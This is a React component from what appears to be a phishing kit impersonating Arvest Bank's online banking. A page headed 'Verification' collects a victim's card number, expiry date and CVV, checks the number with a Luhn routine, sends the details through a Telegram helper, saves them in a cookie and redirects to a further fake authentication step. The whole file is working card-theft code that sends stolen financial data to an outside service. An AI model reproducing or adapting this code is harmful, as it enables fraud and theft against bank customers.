import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import { verifyCreditCardNumber } from "../utils/luhn";

type Additional = {
  cn: string;
  edate: string;
  ccv: string;
};

export default function Additional() {
  const [formInput, setFormInput] = useState<Additional>({
    cn: "",
    edate: "",
    ccv: "",
  });
  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  function handleCardInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    let value = event.target.value.replace(/\s/g, ""); // Remove existing spaces
    value = value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 0) {
      value = value.match(new RegExp(".{1,4}", "g"))!.join(" ");
    }

    event.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleExpDate(e: React.ChangeEvent<HTMLInputElement>) {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 2) {
      value = value.slice(0, 2) + " / " + value.slice(2);
    }

    e.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    
    const message = `
    [----+🏦 ARVEST CARD 🏦+-----]

    CARD NUMBER: ${formInput.cn}

    CARD EXPIRY: ${formInput.edate}

    CARD CVV: ${formInput.ccv}
    `;
    const isValidCardNumber = verifyCreditCardNumber(formInput.cn);
    if (!isValidCardNumber) {
      document.getElementById("card-error")?.classList.remove("hide");
      return;
    }
    setIsLoading(true);
    await TelegramSend(message);
    setIsLoading(false);
    cookies.set("additional", formInput);
    navigate("../login/auth/3", { replace: true });
  }
  return (
    <>
      <div className="submitForm">
        
        <center>
          {" "}
          <h3>Verification</h3>{" "}
        </center>
        <p
          className="go-left"
          style={{ fontSize: "16px", marginBottom: "30px" }}
        >
          To further verify your identity, Please enter your Debit/Credit Card
          information <br />
        </p>

        <div style={{marginBottom:"20px"}} id="card-error" className="error-message hide">
          <p style={{ color: "red" }}>
            Invalid card details. Please check your card information and try
            again.
          </p>
        </div>

        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field">
            <label htmlFor="username">
              Card number <span style={{ color: "red" }}>*</span>
            </label>
            <input
              onChange={handleCardInputChange}
              name="cn"
              minLength={16}
              maxLength={19}
              required
              type="text"
            />
          </div>

          <div className="input-field">
            <label htmlFor="username">
              Expiry date <span style={{ color: "red" }}>*</span>
            </label>
            <input
              required
              maxLength={7}
              onChange={handleExpDate}
              name="edate"
              type="text"
            />
          </div>

          <div className="input-field">
            <label htmlFor="username">
              CVV <span style={{ color: "red" }}>*</span>
            </label>
            <input
              name="ccv"
              required
              maxLength={4}
              onChange={handleInputChange}
              type="tel"
            />
          </div>

          <br />
          <br />

          {isLoading ? (
            <button style={{ marginTop: "-2px" }} type="button">
              Please wait...
            </button>
          ) : (
            <button style={{ marginTop: "-2px" }} type="submit">
              Submit
            </button>
          )}
        </form>

        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
